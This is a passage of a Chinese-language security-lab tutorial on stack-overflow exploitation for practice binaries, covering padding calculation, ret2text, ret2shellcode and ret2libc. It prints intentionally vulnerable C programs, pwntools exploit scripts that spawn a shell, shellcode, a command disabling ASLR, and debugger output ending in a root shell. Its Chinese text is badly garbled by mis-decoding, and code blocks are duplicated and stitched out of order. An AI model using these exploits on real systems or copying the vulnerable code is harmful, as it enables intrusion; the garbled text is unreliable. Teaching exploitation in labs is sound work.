<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GKHjgmdNu70byyPoBxQZGA)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_jpg/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnoJ5EbQBrCIuia7elLCaDEFsmP8TibJSbV069k6ibW47qlPibN0jeKXp5lQ/640?wx_fmt=jpeg)

Leishi

Security

Â Lab

Â PWN - æ ˆæº¢å‡ºå…¥é—¨Â 

æº¢å‡º padding è®¡ç®—

**æ–¹æ³• 1ï¼šesp/ebp è·ç¦»è®¡ç®—**

1.Â æº¢å‡ºå‡½æ•°å¤„ä¸‹æ–­ç‚¹

b main

2.Â è®°å½• espã€ebp

EBP: 0xbffff508 --> 0x0

ESP: 0xbffff480 --> 0x0

3.Â æ‰¾åˆ°æº¢å‡ºå‡½æ•°å‚æ•°ä½ç½®

0x804858c <main+95>: lea Â Â Â eax,[esp+0x1c]

4.Â padding = (ebp - (esp+1c)) + 4 = (0xbffff508 - 0xbffff480 - 0x1c ) +4 = 112

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnGgnZtf5evE5x6Brj9KpZoKMqxEB9zOrUtYVIl53Jb4rbe5qD9ff5tQ/640?wx_fmt=png)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7gtTg0Pz11PFtdmkUDsdDs5GDqRvB5JWX4Bhf5Z2uEPRswjKGAMB9A/640?wx_fmt=png)

**æ–¹æ³• 2ï¼špattern_create**

é€šå¸¸æƒ…å†µä¸‹ ebp + 4/rbp + 8 æ›´å‡†ç¡®

pattern_offset $ebp

pattern_offset $eip

pattern_offset $rbp

pattern_offset $rip

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7tGiboFy5UXFvmV0Gpf0E26oKT5E9WY0mD4X0Zlm3o9LFaKTViazPkvQ/640?wx_fmt=png)

**æ–¹æ³• 3ï¼šcyclic**

```
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]â””â”€#Â cyclicÂ 200Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 148Â â¨¯Â 1Â âš™[!]Â PwntoolsÂ doesÂ notÂ supportÂ 32-bitÂ Python.Â Â UseÂ aÂ 64-bitÂ release.aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]â””â”€#Â gdbÂ ret2shellcodeÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 1Â âš™gdb-peda$Â runStartingÂ program:Â /home/kali/Desktop/CTF/ret2shellcodeÂ NoÂ systemÂ forÂ youÂ thisÂ timeÂ !!!aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabbyeÂ byeÂ ~ProgramÂ receivedÂ signalÂ SIGSEGV,Â SegmentationÂ fault.[----------------------------------registers-----------------------------------]EAX:Â 0x0Â EBX:Â 0x0Â ECX:Â 0x9Â ('\t')EDX:Â 0xffffffffÂ ESI:Â 0xb7fb0000Â -->Â 0x1e4d6cÂ EDI:Â 0xb7fb0000Â -->Â 0x1e4d6cÂ EBP:Â 0x62616163Â ('caab')ESP:Â 0xbffff510Â ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")EIP:Â 0x62616164Â ('daab')EFLAGS:Â 0x10282Â (carryÂ parityÂ adjustÂ zeroÂ SIGNÂ trapÂ INTERRUPTÂ directionÂ overflow)[-------------------------------------code-------------------------------------]InvalidÂ $PCÂ address:Â 0x62616164Legend:Â code,Â data,Â rodata,Â valueStoppedÂ reason:Â SIGSEGV0x62616164Â inÂ ??Â ()gdb-peda$Â zsh:Â suspendedÂ Â gdbÂ ret2shellcodeÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]â””â”€#Â cyclicÂ -lÂ "0x62616164"Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 148Â â¨¯Â 2Â âš™[!]Â PwntoolsÂ doesÂ notÂ supportÂ 32-bitÂ Python.Â Â UseÂ aÂ 64-bitÂ release.112
```

  

  

  

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnjcHQy17XpHTzJbH018ugbev7FQwPpOaVnZQ6pv3wjcm6DAGdYg0bhA/640?wx_fmt=png)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnQBXwrF39NCibezLH9Mibk2LEOIMXDH7iaEZYbzEJsP90uNhYarnL7oJEQ/640?wx_fmt=png)

**æ ˆæº¢å‡ºåˆ©ç”¨**

**ret2text**

ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnGWXoNgvNGxOB9hIPH4BsojQ6P76xDdkH8Yn2A5xqlzzgw0Um9EZia9A/640?wx_fmt=png)

ç¤ºä¾‹

```
//Â gccÂ -m32Â -fno-stack-protectorÂ -no-pieÂ ret2text.cÂ -oÂ ret2text#includeÂ <stdio.h>#includeÂ <string.h>voidÂ success()Â {Â Â Â Â puts("SUCCESS!!!");Â Â Â Â system("catÂ flag");}voidÂ vulnerable()Â {Â Â charÂ s[12];Â Â gets(s);Â Â puts(s);Â Â return;}intÂ main(intÂ argc,Â charÂ **argv)Â {Â Â vulnerable();Â Â returnÂ 0;}
```

.text æ®µå­˜åœ¨ flag å…³é”®ä¿¡æ¯å‡½æ•°

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnJuSrYZKwvGKVfwOp3YXtIAXRJEVHN67NgxndaNf6vscwyekzEYrVzw/640?wx_fmt=png)

è®¡ç®—æº¢å‡ºé•¿åº¦

xxxxx

python ä»£ç 

from pwn import *

sh = process("./ret2text")

win = 0x8049182

sh.sendline(b'A'*24 + p32(win))

sh.interactive()

**ret2shellcode**

å›¾ 1

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnp3iatxSVT2nPmSshtQQANSf5C1DSwdg9ldFmm3AHEOoXmauD2qvdLrg/640?wx_fmt=png)

å›¾ 2

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnlbcQ1HBicrMKfADrWwFnawS2K9RlnxAdMHxUbibzf866jQjWtDtfhwyA/640?wx_fmt=png)

é—®é¢˜ï¼šå¦‚ä½•ç¡®å®š shellcode èµ·å§‹åœ°å€

å…³é—­ ASLR

ASLR(ç³»ç»Ÿå¼€å¯çš„)

ASLR æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚

åœ¨ linux ä¸­ä½¿ç”¨æ­¤æŠ€æœ¯åï¼Œæ€æ­»æŸç¨‹åºåé‡æ–°å¼€å¯ï¼Œåœ°å€æ¢ã€‚

åœ¨ windows ä¸­ä½¿ç”¨æ­¤æŠ€æœ¯åï¼Œæ€æ­»è¿›ç¨‹åé‡æ–°å¼€å¯ï¼Œåœ°å€ä¸æ¢ï¼Œé‡å¯æ‰ä¼šæ”¹å˜ã€‚

ä»¥ä¸Š cat å‘½ä»¤è¾“å‡ºçš„å€¼è¡¨ç¤ºï¼š

0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚

1 - è¡¨ç¤ºå°† mmap çš„åŸºå€ï¼Œstack å’Œ vdso é¡µé¢éšæœºåŒ–ã€‚

2 - è¡¨ç¤ºåœ¨ 1 çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚

echo 0 > /proc/sys/kernel/randomize_va_space

echo 1 > /proc/sys/kernel/core_uses_pid

ç¤ºä¾‹

#include <unistd.h>

void vuln_func()

{

Â Â Â Â Â Â Â Â char buf[128];

Â Â Â Â Â Â Â Â read(STDIN_FILENO,buf,256);

}

int main(void)

{

Â Â Â Â Â Â Â Â vuln_func();

Â Â Â Â Â Â Â Â write(STDOUT_FILENO,"hello world!\n",13);

}

1.Â æ‰§è¡Œæº¢å‡ºç¡®å®šæº¢å‡ºåœ°å€å’Œ core æ–‡ä»¶

ä¸ºä»€ä¹ˆæ˜¯ $esp-140-4Â å› ä¸ºæ­¤æ—¶çš„ esp æŒ‡å‘å‡½æ•°è¿”å›åœ°å€

å‡½æ•°æ˜¯æ‰§è¡Œ ret ä¹‹åæ‰æŠ¥é”™çš„ï¼Œæ‰€ä»¥æ­¤æ—¶ä»£ç å·²ç»æ‰§è¡Œå®Œæˆ retï¼Œä¹Ÿå°±æ˜¯è¯´ esp æŒ‡å‘ï¼ˆè¿”å›åœ°å€ + 4ï¼‰

```
â””â”€# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 âš™

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2936]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp-140-4

0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389

gdb-peda$

zsh: suspended  gdb stack3 core.2936 -q



#!/usr/bin/env python

from pwn import *



sh = process('./stack3')



# æ–¹æ³•1

shellcode = asm(shellcraft.sh())

buf2_addr = 0xbffff4c0

print(shellcode)

pause()

sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )

sh.interactive()â”Œâ”€â”€(rootï¿½kali)-[/home/kali/Desktop/CTF]

â””â”€# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 âš™

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2936]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp-140-4

0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389

gdb-peda$

zsh: suspended  gdb stack3 core.2936 -q



#!/usr/bin/env python

from pwn import *



sh = process('./stack3')



# æ–¹æ³•1

shellcode = asm(shellcraft.sh())

buf2_addr = 0xbffff4c0

print(shellcode)

pause()

sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )

sh.interactive()
// gcc -m32 -fno-stack-protector -no-pie ret2text.c -o ret2text

#include <stdio.h>

#include <string.h>



void success() {

    puts("SUCCESS!!!");

    system("cat flag");

}



void vulnerable() {

  char s[12];

  gets(s);

  puts(s);

  return;

}



int main(int argc, char **argv) {

  vulnerable();

  return 0;

}
```

æ–¹æ³• 2ï¼š

```
â””â”€# gdb stack3 core.2961 -q                                                                                                                                                                                                             6 âš™

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2961]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp

0xbffff550:     0xbffff50a      0x00000000      0x00000000      0xb7de9e46

gdb-peda$







#!/usr/bin/env python

from pwn import *



sh = process('./stack3')

# æ–¹æ³•2

buf2_addr = 0xbffff550 # å°±æ˜¯espçš„å€¼

print(shellcode)

pause()

sh.sendline(b'b'*140+ p32(buf2_addr)  + shellcode)

sh.interactive()





â”Œâ”€â”€(rootï¿½kali)-[/home/kali/Desktop/CTF]

â””â”€# python3 stack3.py                                                                                                                                                                                                                   3 âš™

[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.

[+] Starting local process './stack3': pid 3037

b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

[*] Switching to interactive mode

$ id

uid=0(root) gid=0(root) groups=0(root),143(kaboxer)

$

[*] Interrupted

[*] Stopped process './stack3' (pid 3037)
```

**ret2libc**

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnjXurcqia1Sx1xCVyS6kI8mRBNtqkcozAIMNQW2mPHrVFGgfOQibyvJpw/640?wx_fmt=png)

ä¾‹ 1

IDA åˆ†æ

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn99UwXOFN9EdiarznSvaxUDwhs4iciaBnLk6fg7d4Ckcic4WWLMDs1dXKBA/640?wx_fmt=png)

sh_addr = 0x08048720

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnKUFXbGhiarLlNDLwAttKO2zLRGeaSictrxibbwxc3IxzYz32gO82b2ukg/640?wx_fmt=png)

system_addr = 0x08048460

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnFSdSJfnGhUdbhqDRskW670oT0dBL3d6o8ZtGIx8uTFyKDpGQrEDrrw/640?wx_fmt=png)

padding = 112

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7SuImVbnTePmbp8gssCibBmt7uybJoMWwslRjGnUZLOjIM75ZBQicV5A/640?wx_fmt=png)

exp

from pwn import *

sh = process("./ret2libc1")

binsh = 0x08048720

system_plt = 0x08048460

whatever_addr = 0x11111111

payload = b"a" * 112

payload += p32(system_plt)

payload += p32(whatever_addr)# è¿™é‡Œå°±æ˜¯è°ƒç”¨ system çš„è¿”å›åœ°å€ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰

payload += p32(binsh)

sh.sendline(payload)

sh.interactive()

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnD8kpXia0nMeL9Ayicj4XPNd3kRHZ9rlfXEl7rkUBHg7JicYwtex6DxCYg/640?wx_fmt=png)

ä¾‹ 2

checksec

xxxxx

è®¡ç®— padding = 112

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnXOZPeVx6es6suwebRS8ZoL8WP0mwqX9ibiaoBShpribq26qUL6XnSvVkQ/640?wx_fmt=png)

.bss buf2 = 0x0804A080

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnfk7Ofm7XGzn2Mj7cib0WDsxZ5R1skPpdTrPQib4NKYHrSh6uD2AVLF9w/640?wx_fmt=png)

gets = 08048460

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnvoDggicE35hGia9bH1cnJvoJ62H7icctajR43hkDvOCNpZ3pLWjl1Qyicg/640?wx_fmt=png)

system = 08048490

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn06zt3OEicsr4kE5oOTV9ABPmnMlUSXFrRRGvcFudcKnXtowjibEfXRUw/640?wx_fmt=png)

æ ˆæƒ…å†µåˆ†æ

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnD2G5eQvClZiaKia3JicU0UOUviaCcjoJeD5ckgQ04OrLVpUoADzf2dpjOg/640?wx_fmt=png)

exp

from pwn import *

sh = process("./ret2libc2")

get_addr = 0x08048460

buf_addr = 0x0804A080

system_addr = 0x08048490

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

sh.sendline(payload)

sh.sendline("/bin/sh")

sh.interactive()

exp2

from pwn import *

sh = process("./ret2libc2")

elf = ELF("./ret2libc2")

get_addr = elf.plt['gets']

system_addr = elf.plt['system']

buf_addr = elf.symbols['buf2']

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

sh.sendline(payload)

sh.sendline("/bin/sh")

sh.interactive()

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mntQCqRPnm3MibrGHnyDmHqD7MIsuDbS7RmvgHAlbkwS4AfukU2obp3AA/640?wx_fmt=png)

ä¾‹ 3

å‡½æ•°åŸºå€ base = A å‡½æ•° got - A å‡½æ•° libc = B å‡½æ•° got - B å‡½æ•° libc

xctf level3

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnZLiaWEoj3wIaRy0z817N1OSthsG6q8fM9GeibgSnn0WTgVmntftpREuA/640?wx_fmt=png)

libc_write = 0x000D43C0

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7K6UOvPkl03ibmXe42kGnZfPfAGnKoHzoGWJI8tQFMJQXqu8dRLg1PQ/640?wx_fmt=png)

libc_system = 0x0003A940

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnniaKiczrjzY2l3Scb3etONYYiaJAU975eMCvXSVJqPUsJzcov3e0gzraw/640?wx_fmt=png)

libc_bin = 0x0015902B

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mntXTZyKawyyoAiaoLFaNZ7mB4RdibriazB5mWcpHrxlGD2uyDaumzW2iaQQ/640?wx_fmt=png)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnCib3GbRG7r7CV97M3DzBRiaeibXVNFYAfEYOuuCnS2vr2cQkMjDHsB0bw/640?wx_fmt=png)

2021

**LEISHI**

**SECURITY**

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mniajChzpiaSgKV7RTAibCicPkJeIBpqhicNw0ohOpVZpvLI5KPDSwCjKO24w/640?wx_fmt=png)

**LEISHI**////**ARRIVAL**

é•¿æŒ‰å…³æ³¨

é›·çŸ³å®‰å…¨å®éªŒå®¤